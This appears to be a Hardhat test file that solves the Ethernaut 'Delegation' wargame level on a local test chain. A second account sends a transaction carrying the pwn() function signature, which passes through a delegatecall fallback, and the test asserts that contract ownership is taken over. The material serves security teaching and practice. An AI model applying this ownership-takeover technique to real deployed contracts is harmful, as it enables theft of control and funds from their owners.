const { expect } = require("chai");
const { ethers } = require("hardhat");
const utils = require("../scripts/lib/utils");

describe("Ethernaut Delegation", function () {		  
	let delegation, delegate;	//contracts
	let owner, addr1;			//accounts
	
	beforeEach(async function () {
		[owner, addr1, ...addrs] = await ethers.getSigners();
        
        //deploy contracts 
		delegate = await utils.deployContractSilent("Delegate", owner.address);
		delegation = await utils.deployContractSilent("Delegation", delegate.address);
	});
	      
	describe("Initial State", function () {
		it("owners", async function () {
			//owner should be owner of both contracts 
            expect(await (delegation.owner())).to.equal(owner.address);
            expect(await (delegate.owner())).to.equal(owner.address);
		});
    });    
	      
	describe("Delegation Call", function () {
		it("pwn", async function () {
			
			//call Delegation with function signature of Delegate.pwn()
			const token = await addr1.sendTransaction({
				to: delegation.address, 
				data: utils.encodeFunctionSignature("pwn")
			}); 
			await token.wait();
			
			//Delegation's owner should be changed to addr1
           	expect(await (delegation.owner())).to.equal(addr1.address);
		});
    });   
});